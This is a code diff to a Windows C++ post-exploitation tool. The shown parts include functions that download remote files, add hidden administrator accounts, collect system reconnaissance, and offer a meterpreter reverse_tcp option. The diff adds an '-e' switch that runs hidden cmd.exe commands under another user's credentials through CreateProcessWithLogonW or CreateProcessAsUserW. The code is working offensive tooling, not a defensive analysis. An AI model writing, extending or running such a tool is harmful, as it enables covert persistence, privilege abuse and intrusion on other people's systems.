@@ -4,13 +4,23 @@
 #include <urlmon.h>
 #include <Aclapi.h>
 #include <lm.h>
+#include <iostream>
 #include <stdio.h>
+#include <stdexcept>
+#include <string>
 
 #pragma comment(lib,"urlmon.lib")
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib,"WS2_32.lib")
+using namespace std;
 
+//类型转换
+wchar_t *c2wc(const char *Str) {
+	wchar_t *Wchar = new wchar_t[strlen(Str) + 1];
+	mbstowcs(Wchar, Str, strlen(Str) + 1);
+	return Wchar;
+}
 
 ///////////////////////////
 /* init winsock */
@@ -147,16 +157,12 @@ void OnBnClickedChange(char*name)
 	//程序结束，关闭打开的hKEY
 	RegCloseKey(hKey);
 }
-//类型转换
-wchar_t *c2wc(const char *Str) {
-	wchar_t *Wchar = new wchar_t[strlen(Str) + 1];
-	mbstowcs(Wchar, Str, strlen(Str) + 1);
-	return Wchar;
-}
+
 //下载函数
 void download(wchar_t szurl[MAXBYTE],wchar_t szpaath[MAX_PATH]) {
 	URLDownloadToFileW(NULL, szurl, szpaath, NULL, NULL);
 }
+
 //添加用户使用系统api
 void apiAdd(wchar_t *name, wchar_t *pass) {
 	USER_INFO_1 ui;
@@ -190,22 +196,92 @@ void apiAdd(wchar_t *name, wchar_t *pass) {
 	else
 		printf("Fail to add %s to administrators. Error code: %d...\n", name, nStatus);
 }
+
+//切换user权限运行程序
+int runcmd(wchar_t* username,wchar_t*password, wchar_t*cmdexe) {
+
+	const char* cmd = "whoami";
+	char buffer[128];
+	string result = "";
+	FILE* pipe = _popen(cmd, "r");
+	if (!pipe) throw runtime_error("popen() failed!");
+	try {
+		while (!feof(pipe)) {
+			if (fgets(buffer, 128, pipe) != NULL)
+				result += buffer;
+		}
+	}
+	catch (...) {
+		_pclose(pipe);
+		throw;
+	}
+	_pclose(pipe);
+	if (result.find("nt authority\\system") != 0)
+	{
+		wchar_t buffer_pwd[MAX_PATH];
+		GetCurrentDirectoryW(sizeof(buffer_pwd), buffer_pwd);
+		wchar_t command[128];
+		wcscpy(command, L"/c ");
+		wcscat(command, cmdexe);
+		STARTUPINFOW si = { 0 };
+		PROCESS_INFORMATION pi = { 0 };
+		si.cb = sizeof(si);
+		SetLastError(0);
+		if (!CreateProcessWithLogonW(username, NULL,password, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", command, CREATE_NO_WINDOW, NULL, buffer_pwd, &si, &pi))
+		{
+			cout << "create error ! code" << GetLastError() << endl;
+			return 1;
+
+		}
+	}
+	else
+	{
+		wchar_t command[128];
+		wcscpy(command, L"/c ");
+		wcscat(command, cmdexe);
+		wchar_t buffer_pwd[MAX_PATH];
+		GetCurrentDirectoryW(sizeof(buffer_pwd), buffer_pwd);
+		HANDLE outhToken;
+		SetLastError(0);
+		STARTUPINFOW si = { 0 };
+		PROCESS_INFORMATION pi = { 0 };
+		si.cb = sizeof(si);
+		SetLastError(0);
+		if (!LogonUserW(username, NULL, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &outhToken))
+		{
+			cout << "user handle create failed!error code:" << GetLastError() << endl;
+			return 1;
+		}
+		SetLastError(0);
+		if (!CreateProcessAsUserW(outhToken, L"C:\\Windows\\System32\\cmd.exe", command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, buffer_pwd, &si, &pi))
+		{
+			cout << "create error ! code" << GetLastError() << endl;
+			return 1;
+		}
+	}
+}
+
+
 int main(int argc, char* argv[])
 {
 	
 	if (!(argc > 1)) {
-		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message]");
+		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message] \n [-e User password 'command > file.txt' | Other permission execution commands]");
 		exit(1);
 	}
 
 	if (strcmp(argv[1], "-h") == 0) {
-		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message]");
+		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message] \n [-e User password 'command > file.txt' | Other permission execution commands]");
 		exit(1);
 	}
 	else if (strcmp(argv[1],"-d")==0){
 		if((argv[2]==NULL)==true){
 			printf("Please enter url");
 			exit(1);
+		}
+		else if((argv[3]==NULL)==true)
+		{
+			printf("file name");
 		}
 		download(c2wc(argv[2]),c2wc(argv[3]));
 		printf("%s""download ok");
@@ -258,9 +334,26 @@ int main(int argc, char* argv[])
 		system("systeminfo>info.txt && ipconfig>>info.txt && netstat -aon>>info.txt && tasklist>>info.txt && net user>>info.txt && fsutil fsinfo drives>>info.txt&& wmic service list>>info.txt");
 		printf("Enter info.txt ok");
 	}
+
+	else if(strcmp(argv[1],"-e")==0)
+	{
+		if ((argv[2] == NULL) == true) {
+			printf("Please enter username");
+			exit(1);
+		}
+		else if ((argv[3] == NULL) == true) {
+			printf("Please enter password");
+			exit(1);
+		}
+		else if ((argv[4] == NULL) == true) {
+			printf("Please enter cmdand");
+			exit(1);
+		}
+		runcmd(c2wc(argv[2]), c2wc(argv[3]), c2wc(argv[4]));
+	}
 	else
 	{
-		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message]");
+		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message] \n [-e User password 'command > file.txt' | Other permission execution commands]");
 		exit(1);
 	}
 
